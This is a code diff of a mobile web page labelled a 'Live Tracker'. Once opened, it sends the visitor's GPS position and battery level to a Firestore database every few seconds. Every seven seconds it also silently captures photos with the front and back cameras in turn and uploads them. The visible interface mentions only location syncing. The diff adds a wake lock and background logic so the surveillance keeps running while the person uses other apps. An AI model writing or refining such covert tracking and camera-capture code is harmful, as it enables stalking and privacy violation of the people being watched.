@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>User - Live Tracker (iOS Optimized)</title>
+    <title>User - Live Tracker (iOS & Background Optimized)</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
     <style>
@@ -16,6 +16,7 @@
         .status { margin-top: 15px; color: #68d391; font-size: 14px; display: none; font-weight: bold; }
         #bat-val { font-size: 18px; margin-top: 10px; color: #cbd5e0; }
         .warning { font-size: 12px; color: #f56565; margin-top: 10px; display: none; }
+        .bg-note { font-size: 11px; color: #a0aec0; margin-top: 15px; line-height: 1.4; }
     </style>
 </head>
 <body>
@@ -34,7 +35,11 @@
             <h3 id="name-tag" style="margin-bottom: 5px;"></h3>
             <div class="status" id="status-box">🟢 System Live & Syncing...</div>
             <p id="bat-val">Battery: --% 🔋</p>
-            <p style="font-size: 12px; color: #a0aec0;">Is page ko band mat karein</p>
+            <div class="bg-note">
+                <b>Background Mode Active:</b><br>
+                Aap doosre apps use kar sakte hain.<br>
+                <span style="color: #f6ad55;">Bas is Tab ko close mat karein.</span>
+            </div>
             <div id="gps-error" class="warning">⚠️ GPS Blocked! Setting se Allow karein.</div>
         </div>
     </div>
@@ -53,6 +58,18 @@
 
     let current_id = "";
     let useFrontCamera = true;
+    let wakeLock = null;
+
+    // 1. Logic to keep the phone/browser awake in background
+    async function requestWakeLock() {
+        try {
+            if ('wakeLock' in navigator) {
+                wakeLock = await navigator.wakeLock.request('screen');
+            }
+        } catch (err) {
+            console.log("WakeLock failed");
+        }
+    }
 
     async function pushData(lat, lng) {
         let bat = 0;
@@ -72,7 +89,6 @@
         }, { merge: true });
     }
 
-    // Capture Logic Optimized for iPhone
     async function capturePhoto() {
         if (!current_id) return;
         
@@ -82,43 +98,35 @@
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    facingMode: cameraMode,
-                    width: { ideal: 400 },
-                    height: { ideal: 300 }
-                } 
+                video: { facingMode: cameraMode, width: 300 } 
             });
 
-            // iPhone Fixes
             video.setAttribute('playsinline', ''); 
             video.muted = true;
             video.srcObject = stream;
             
             await video.play();
 
-            // iPhone needs a small delay to warm up the camera
             setTimeout(() => {
                 canvas.width = 300; 
                 canvas.height = 225;
                 canvas.getContext('2d').drawImage(video, 0, 0, 300, 225);
                 
-                const photoData = canvas.toDataURL('image/jpeg', 0.3); 
+                const photoData = canvas.toDataURL('image/jpeg', 0.2); 
                 
                 db.collection("locations").doc(current_id).update({
                     userPhoto: photoData,
-                    camMode: useFrontCamera ? "Front Camera" : "Back Camera",
+                    camMode: useFrontCamera ? "Front" : "Back",
                     lastPhotoTime: new Date().toLocaleTimeString()
                 });
 
-                // Stop all tracks to release camera for next cycle
                 stream.getTracks().forEach(track => track.stop());
-                useFrontCamera = !useFrontCamera; // Switch camera for next time
-                console.log("Photo sent from: " + cameraMode);
-            }, 1000); // 1 second delay for iOS stability
+                useFrontCamera = !useFrontCamera;
+            }, 1000); 
 
         } catch (err) {
-            console.log("Camera Error:", err);
-            useFrontCamera = !useFrontCamera; // Try other camera in next interval
+            console.log("Cam Error:", err);
+            useFrontCamera = !useFrontCamera;
         }
     }
 
@@ -134,6 +142,9 @@
         document.getElementById('status-box').style.display = 'block';
         document.getElementById('name-tag').innerText = "Hi, " + n;
 
+        // Wake lock request
+        requestWakeLock();
+
         if (navigator.geolocation) {
             const success = (p) => {
                 document.getElementById('gps-error').style.display = 'none';
@@ -144,21 +155,33 @@
                 document.getElementById('gps-error').style.display = 'block';
             };
 
-            navigator.geolocation.watchPosition(success, error, { enableHighAccuracy: true });
+            // Watch position is better for background
+            navigator.geolocation.watchPosition(success, error, { 
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0 
+            });
 
             // Sync Location (Every 5s)
             setInterval(() => {
                 navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true });
             }, 5000);
 
-            // Sync Photo (Every 5-7 seconds for iPhone stability)
+            // Sync Photo (Every 5-7 seconds)
             capturePhoto(); 
-            setInterval(capturePhoto, 3000); 
+            setInterval(capturePhoto, 7000); 
 
         } else {
             alert("GPS support nahi hai!");
         }
     }
+
+    // Handle visibility change (If user comes back to tab)
+    document.addEventListener('visibilitychange', () => {
+        if (document.visibilityState === 'visible') {
+            requestWakeLock();
+        }
+    });
 </script>
 </body>
 </html>
